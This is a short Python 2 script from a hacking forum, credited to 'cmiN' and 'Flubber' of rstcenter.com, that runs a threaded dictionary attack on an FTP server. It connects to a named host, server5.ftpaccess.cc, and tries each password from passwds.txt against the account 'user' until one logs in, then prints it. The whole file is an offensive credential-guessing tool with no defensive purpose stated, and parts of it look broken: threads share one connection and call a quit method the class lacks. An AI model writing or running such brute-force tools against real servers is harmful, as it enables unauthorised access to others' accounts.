#! /usr/bin/env python
# 14.08.2010 <> 14.08.2010 | cmiN (originally coded by Flubber)
# FTP DA 4 Flubber @ rstcenter.com

import threading
from ftplib import FTP

def main():
    threads = 5
    host = "server5.ftpaccess.cc"
    port = 21
    timeout = 30
    DA.sock = FTP()
    try:
        DA.sock.connect(host, port, timeout)
    except:
        return 1
    else:
        fobj = open("passwds.txt", "rt")
        for line in fobj:
            while threading.active_count() > threads:
                pass
            DA(line.strip("\n")).start() # line[:-1]
            if DA.status:
                break
        while threading.active_count() > 1:
            pass
        fobj.close()
    return 0

class DA(threading.Thread):
    
    status = False
    
    def __init__(self, passwd):
        threading.Thread.__init__(self)
        self.passwd = passwd
        
    def run(self):
        try:
            self.sock.login("user", self.passwd)
            self.sock.getwelcome()
            self.quit()
        except:
            pass
        else:
            DA.status = True
            print self.passwd
    
if __name__ == "__main__":
    main()
